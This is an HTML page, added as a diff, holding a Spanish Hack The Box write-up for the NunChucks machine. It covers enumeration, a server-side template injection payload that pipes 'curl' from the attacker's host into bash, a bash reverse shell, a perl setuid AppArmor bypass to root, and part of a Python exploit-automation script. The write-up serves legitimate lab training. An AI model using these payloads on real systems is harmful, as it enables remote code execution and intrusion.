@@ -1,0 +1,916 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>NunChucks HTB Write-up - grafis Blog</title>
+<meta name="description" content="En este artículo comparto el write up de la máquina NunChucks de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="grafis Blog">
+<meta property="og:title" content="NunChucks HTB Write-up">
+<meta property="og:url" content="http://localhost:4000/Nunchucks/">
+
+
+  <meta property="og:description" content="En este artículo comparto el write up de la máquina NunChucks de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/imagenes/NunChucks/nun_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-02-12T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/Nunchucks/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "grafis",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="grafis Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">NunChucks HTB Write-up</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="grafis" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">grafis</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Estudiante de Ingeniería Civil en Informática y Telecomunicaciones
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/mirko-babic-velásquez-4979bb219" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/grafis0" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="NunChucks HTB Write-up">
+    <meta itemprop="description" content="En este artículo comparto el write up de la máquina NunChucks de Hack The Box">
+    <meta itemprop="datePublished" content="February 12, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">NunChucks HTB Write-up
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-02-12T00:00:00-05:00">February 12, 2023 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/imagenes/NunChucks/Nunchucks_banner.png" width="550" height="250" />
+</p>
+
+<h1 id="resumen"><a href="#header-2"></a>Resumen</h1>
+
+<p>Saludos, en esta oportunidad vamos a resolver la máquina de <strong>Hack The Box</strong> llamada <strong>NunChucks</strong>, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:</p>
+
+<ul>
+  <li>Enumeración del sistema y subdominios.</li>
+  <li>SSTI.</li>
+  <li>AppArmor Bypass (Shebang).</li>
+  <li>Automatización de la intrusión.</li>
+</ul>
+
+<h2 id="reconocimiento-y-enumeración"><a href="#header-2"></a>Reconocimiento y Enumeración</h2>
+
+<p>En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando <code class="language-plaintext highlighter-rouge">ping</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.11.122
+
+PING 10.10.11.122 (10.10.11.122) 56(84) bytes of data.
+64 bytes from 10.10.11.122: icmp_seq=1 ttl=63 time=143 ms
+</code></pre></div></div>
+<p>Se observa que existe una correcta conexión con la máquina.</p>
+
+<p>Para realizar un reconocimiento activo se utilizará la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro <code class="language-plaintext highlighter-rouge">-sS</code> el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- -sS --open -min-rate 5000 10.10.10.239 -oG Port
+</code></pre></div></div>
+<p>Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+</code></pre></div></div>
+<p>Realizamos un escaneo de los servicios expuestos utilizando <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sCV -p22,80,443 10.10.11.122 -oN ServiceScan
+</code></pre></div></div>
+
+<p>Como resultado del escaneo tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 6c146dbb7459c3782e48f511d85b4721 (RSA)
+|   256 a2f42c427465a37c26dd497223827271 (ECDSA)
+|_  256 e18d44e7216d7c132fea3b8358aa02b3 (ED25519)
+80/tcp  open  http     nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to https://nunchucks.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
+| tls-nextprotoneg: 
+|_  http/1.1
+|_http-title: Nunchucks - Landing Page
+| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
+| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
+| Not valid before: 2021-08-30T15:42:24
+|_Not valid after:  2031-08-28T15:42:24
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<p>Observamos <strong>http</strong> y <strong>https</strong>, utilizaremos <code class="language-plaintext highlighter-rouge">whatweb</code> para enumerar información:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.11.122
+
+http://10.10.11.122 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], RedirectLocation[https://nunchucks.htb/], Title[301 Moved Permanently], nginx[1.18.0]
+ERROR Opening: https://nunchucks.htb/ - no address for nunchucks.htb
+</code></pre></div></div>
+
+<p>Observamos que existe el dominio nunchucks.htb, lo agregaremos al /etc/hosts en caso de que se esté realizando virtual hosting.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+10.10.11.122    nunchucks.htb
+</code></pre></div></div>
+
+<p>Haciendo posible ahora la comunicación.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.11.122
+
+http://10.10.11.122 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], RedirectLocation[https://nunchucks.htb/], Title[301 Moved Permanently], nginx[1.18.0]
+
+https://nunchucks.htb/ [200 OK] Bootstrap, Cookies[_csrf], Country[RESERVED][ZZ], Email[support@nunchucks.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.122], JQuery, Script, Title[Nunchucks - Landing Page], X-Powered-By[Express], nginx[1.18.0]
+</code></pre></div></div>
+<p>Observamos ahora más información de la página, vamos a entrar utilizando el navegador:</p>
+
+<p><img src="/imagenes/NunChucks/nun1.png" alt="" /></p>
+
+<p>Es una página estática, sin embargo, tiene una sección de login</p>
+
+<p><img src="/imagenes/NunChucks/nun2.png" alt="" /></p>
+
+<p>Sin embargo, no funciona. La de registro tampoco funciona, lo que nos hace pensar que quizas no es por aqui. si realizamos fuzzing no encontraremos nada interesante en este punto. Por lo tanto, buscaremos posibles subdominios:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hc=404,403 --hh=30587 -w /home/kali/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.nunchucks.htb" -t 200 https://nunchucks.htb
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
+=====================================================================
+
+000000081:   200        101 L    259 W      4028 Ch     "store" 
+</code></pre></div></div>
+<p>Ocultando el codigo 404 y el largo de 30587, pues esta página tenía gran cantidad de direcciones que no llevaban a ningún lado.</p>
+
+<p>Tenemos entonces un subdominio llamado store, vamos a revisarlo:</p>
+
+<p><img src="/imagenes/NunChucks/nun3.png" alt="" /></p>
+
+<p>Tenemos una sección para enviar algo, vamos a probarla:</p>
+
+<p><img src="/imagenes/NunChucks/nun4.png" alt="" /></p>
+
+<h2 id="explotación"><a href="#header-2"></a>Explotación</h2>
+
+<p>Observamos que en la respuesta <strong>You will receive updates on the following email address: test@test.com.</strong> está nuestro imput, quiere decir que al menos si se está realizando la petición, utilizaremos <code class="language-plaintext highlighter-rouge">Burpsuite</code> para analizar:</p>
+
+<p><img src="/imagenes/NunChucks/nun5.png" alt="" /></p>
+
+<p>Observamos que nuestro imput se reconoce allá, si probamos diferentes injecciones nos daremos cuenta que al parecer no es vulnerable, hasta que intentamos con SSTI, si vamos a la página de <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">HackTricks</a>, encontraremos varias formas de probar SSTI, probaremos con la primera:</p>
+
+<p><img src="/imagenes/NunChucks/nun6.png" alt="" /></p>
+
+<p>Observamos que el resultado es 49, lo que hace vulnerable a SSTI al sitio, ahora tenemos que identificar a qué tipo pertenece.</p>
+
+<p>Si provocamos un error vemos lo siguiente:</p>
+
+<p><img src="/imagenes/NunChucks/nun7.png" alt="" /></p>
+
+<p>Observamos <strong>/var/www/store.nunchucks/node_modules/</strong> lo que nos dice que se trata de un servidor utilizando node.js.</p>
+
+<p>Otra forma puede ser utilizando wappalyzer:</p>
+
+<p><img src="/imagenes/NunChucks/nun8.png" alt="" /></p>
+
+<p>Bien, si filtramos por node.js en la web de HackTricks encontramos diversos, pero hay uno que tiene un nombre particular y si probamos cada uno de los test darán todos como debería:</p>
+
+<p><img src="/imagenes/NunChucks/nun9.png" alt="" /></p>
+
+<p>Vamos a intentar utilizar el primer <strong>payload</strong>:</p>
+
+<p><img src="/imagenes/NunChucks/nun10.png" alt="" /></p>
+
+<p>Utilizando backslash escapamos las comillas dobles y al enviarlo vemos que ha listado correctamente el archivo <strong>/etc/passwd</strong>, por lo tanto, ahora solo falta ganar acceso.</p>
+
+<p>Para ello utilizaremos el siguiente comando (va en doble llave):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>range.constructor(\"return global.process.mainModule.require('child_process').execSync('curl 10.10.14.17 | bash')\")()
+</code></pre></div></div>
+<p>Haremos una petición a nuestro servidor http, el cual estará compartiendo este archivo index.html:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash bash -i &gt;&amp; /dev/tcp/10.10.14.17/1235 0&gt;&amp;1 
+</code></pre></div></div>
+
+<p>Y a su vez, estaremos escuchando con <code class="language-plaintext highlighter-rouge">netcat</code> por el puerto 1235, si mandamos la información:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.122 - - [12/Feb/2023 01:13:05] "GET / HTTP/1.1" 200 -
+</code></pre></div></div>
+<p>Y en el <code class="language-plaintext highlighter-rouge">netcat</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.11.122] 43250
+bash: cannot set terminal process group (1005): Inappropriate ioctl for device
+bash: no job control in this shell
+david@nunchucks:/var/www/store.nunchucks$ 
+</code></pre></div></div>
+
+<p>¡Bien!, estamos dentro de la máquina, buscamos la flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@nunchucks:~$ cat user.txt
+cat user.txt
+e707026421f7744f3c6c7a7a6
+</code></pre></div></div>
+
+<p>Excelente ahora toca escalar privilegios.</p>
+
+<h2 id="escalada-de-privilegios"><a href="#header-2"></a>Escalada de privilegios</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@nunchucks:~$ id
+uid=1000(david) gid=1000(david) groups=1000(david)
+david@nunchucks:~$ sudo -l
+[sudo] password for david: 
+Sorry, try again.
+[sudo] password for david: 
+sudo: 1 incorrect password attempt
+david@nunchucks:~$ netstat -nat
+
+Command 'netstat' not found, but can be installed with:
+
+apt install net-tools
+Please ask your administrator.
+</code></pre></div></div>
+
+<p>No podemos ver los privilegios porque no tenemos la contraseña.</p>
+
+<p>Si buscamos por SUID encontramos cosas:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@nunchucks:~$ find / -perm -4000 2&gt;/dev/null
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/mount
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/su
+/usr/bin/sudo
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/pppd
+</code></pre></div></div>
+<p>Sin embargo, no utilizaremos <code class="language-plaintext highlighter-rouge">pkexec</code> para escalar privilegios.</p>
+
+<p>Podríamos ver las capabilities:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@nunchucks:~$ getcap -r / 2&gt;/dev/null
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+
+david@nunchucks:~$ 
+</code></pre></div></div>
+
+<p>Observamos la capabilitie setuid para perl, buscamos en gtfobins para ver si hay posibilidad de escalar privilegios:</p>
+
+<p><img src="/imagenes/NunChucks/nun11.png" alt="" /></p>
+
+<p>Vemos una forma de ejecutar comandos de forma privilegiada con esto:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+</code></pre></div></div>
+
+<p>Vamos a intentarlo:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+</code></pre></div></div>
+
+<p>Sin embargo, no ocurre nada. Si probamos con otro comando:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
+root
+</code></pre></div></div>
+<p>En este caso si lo ejecuta.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "ls /root/";'
+ls: cannot open directory '/root/': Permission denied
+</code></pre></div></div>
+<p>Y ahora no.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "ls -la /root/root.txt";'
+-r-------- 1 root root 33 Feb 14 05:17 /root/root.txt
+</code></pre></div></div>
+<p>Y ahora si, esto nos hace pensar que de alguna forma hay reglas definidas para qué cosas puedes hacer o puede ver. Si buscamos en la web encontramos que existe, por ejemplo, SELinux, que es un módulo de seguridad para el kernel de linux. Si buscamos algunas variantes de esto encontramos <strong>AppArmor</strong>, el cual funciona como un módulo de seguridad, sin embargo, restringe las capacidades de un programa y permite administrar todo eso. Podría ser que se esté aplicando, vamos a buscar si encontramos algo de eso en la máquina.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@nunchucks:/etc/apparmor$ find / -name *apparmor* 2&gt;/dev/null | grep -vE "var|proc|sys"
+/usr/share/doc/apparmor-notify
+/usr/share/doc/apparmor
+/usr/share/doc/python3-apparmor
+/usr/share/doc/libapparmor-perl
+/usr/share/doc/apparmor-easyprof
+/usr/share/doc/python3-libapparmor
+/usr/share/doc/libapparmor1
+/usr/share/doc/apparmor-utils
+/usr/share/apport/package-hooks/source_apparmor.py
+/usr/share/lintian/overrides/apparmor-notify
+/usr/share/lintian/overrides/apparmor
+/usr/share/lintian/overrides/python3-apparmor
+/usr/share/lintian/overrides/libapparmor-perl
+/usr/share/lintian/overrides/apparmor-easyprof
+/usr/share/lintian/overrides/python3-libapparmor
+/usr/share/lintian/overrides/libapparmor1
+/usr/share/lintian/overrides/apparmor-utils
+/usr/src/linux-headers-5.4.0-86/security/apparmor
+/usr/src/linux-headers-5.4.0-81-generic/include/config/security/apparmor
+/usr/src/linux-headers-5.4.0-81-generic/include/config/security/apparmor.h
+/usr/src/linux-headers-5.4.0-81-generic/include/config/default/security/apparmor.h
+/usr/src/linux-headers-5.4.0-86-generic/include/config/security/apparmor
+/usr/src/linux-headers-5.4.0-86-generic/include/config/security/apparmor.h
+/usr/src/linux-headers-5.4.0-86-generic/include/config/default/security/apparmor.h
+/usr/src/linux-headers-5.4.0-81/security/apparmor
+/etc/apparmor.d
+/etc/apparmor.d/abstractions/apparmor_api
+/etc/apparmor.d/tunables/apparmorfs
+/etc/xdg/autostart/apparmor-notify.desktop
+/etc/apparmor
+/etc/rcS.d/S01apparmor
+/etc/init.d/apparmor
+</code></pre></div></div>
+
+<p>Encontramos cosas sobre apparmor, lo que quiere decir que si se está aplicando en este caso.</p>
+
+<p>Entraremos al /etc/apparmor.d:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@nunchucks:/etc/apparmor$ cd /etc/apparmor.d
+david@nunchucks:/etc/apparmor.d$ ls
+abstractions  disable  force-complain  local  lsb_release  nvidia_modprobe  sbin.dhclient  tunables  usr.bin.man  usr.bin.perl  usr.sbin.ippusbxd  usr.sbin.mysqld  usr.sbin.rsyslogd  usr.sbin.tcpdump
+david@nunchucks:/etc/apparmor.d$ 
+</code></pre></div></div>
+
+<p>Podemos que se encuentra el <strong>usr.bin.perl</strong>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Last Modified: Tue Aug 31 18:25:30 2021
+#include &lt;tunables/global&gt;
+
+/usr/bin/perl {
+  #include &lt;abstractions/base&gt;
+  #include &lt;abstractions/nameservice&gt;
+  #include &lt;abstractions/perl&gt;
+
+  capability setuid,
+
+  deny owner /etc/nsswitch.conf r,
+  deny /root/* rwx,
+  deny /etc/shadow rwx,
+
+  /usr/bin/id mrix,
+  /usr/bin/ls mrix,
+  /usr/bin/cat mrix,
+  /usr/bin/whoami mrix,
+  /opt/backup.pl mrix,
+  owner /home/ r,
+  owner /home/david/ r,
+
+}
+</code></pre></div></div>
+<p>Acá podemos ver los permisos que tienen definidos para este binario, en este punto debemos pensar en encontrar una forma de burlar esta seguridad, vamos a buscar algun bug o falla de este sistema por la web, encontramos en la web de <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/apparmor">HackTricks</a> una forma de bypass de apparmor, la cual es hacer uso del Shebang, que corresponde a las cabeceras en los archivos tipo <strong>!#/bin/bash</strong>, esto quiere decir que podemos ejecutar con perl un archivo si utilizamos la cabecera, y apparmor no nos limitará. Para esto crearemos el siguiente archivo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/perl
+
+use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";
+</code></pre></div></div>
+<p>Llamaremos a este archivo test.sh, si lo ejecutamos:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>david@nunchucks:~$ ./test.sh
+# whoami
+root
+</code></pre></div></div>
+
+<p>De esta forma burlamos el apparmor y pudimos cambiarnos el uid a 0 y spawnear un shell. Siendo ya root buscamos la flag:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cat root.txt
+a275bba6e914afcf25ff7bef2d
+
+</code></pre></div></div>
+<p>¡Listo! Nos hemos convertido en administrador.</p>
+
+<p>Antes de terminar, como extra haremos la automatización de la intrusión en python.</p>
+
+<p>Las librerías son las siguientes:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">socket</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</code></pre></div></div>
+<p>Las variables globales son:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ipHost</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">nunIP</span> <span class="o">=</span> <span class="s">'https://store.nunchucks.htb/api/submit'</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Luego, tenemos la primera función que se encarga de escribir en un archivo llamado index.html, el cual lleva el código para entablar la conexión hacia nuestra máquina:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">html_payload</span><span class="p">():</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"index.html"</span><span class="p">,</span><span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+        <span class="n">Shebang</span> <span class="o">=</span> <span class="s">"#!/bin/bash</span><span class="se">\n</span><span class="s">"</span>
+        <span class="n">payload</span> <span class="o">=</span><span class="sa">f</span><span class="s">'bash -i &gt;&amp; /dev/tcp/</span><span class="si">{</span><span class="n">ipHost</span><span class="si">}</span><span class="s">/1234 0&gt;&amp;1'</span>
+        <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">Shebang</span><span class="p">)</span>
+        <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div></div>
+<p>La siguiente funición se encarga de explotar el <strong>SSTI</strong>:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">ssti</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">""" {\{range.constructor(</span><span class="se">\"</span><span class="s">return global.process.mainModule.require('child_process').execSync('curl %s | bash')</span><span class="se">\"</span><span class="s">)()}} """</span> <span class="o">%</span> <span class="n">ipHost</span>
+    <span class="c1"># el primer backslash del payload no va, es solo para que la sintaxis de md me deje poner el payload.
+</span>    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span> 
+        <span class="s">"email"</span><span class="p">:</span> <span class="n">payload</span>
+     <span class="p">}</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Explotando el SSTI"</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">nunIP</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+</code></pre></div></div>
+<p>La última función corresponde a la del servidor http:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">http_server</span><span class="p">():</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">so</span><span class="p">:</span>
+            <span class="n">so</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">80</span><span class="p">))</span>
+            <span class="n">http_server</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"python3"</span><span class="p">,</span> <span class="s">"-m"</span><span class="p">,</span> <span class="s">"http.server"</span><span class="p">,</span> <span class="s">"80"</span><span class="p">])</span>
+    <span class="k">except</span> <span class="nb">OSError</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Finalmente, tenemos el main:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+
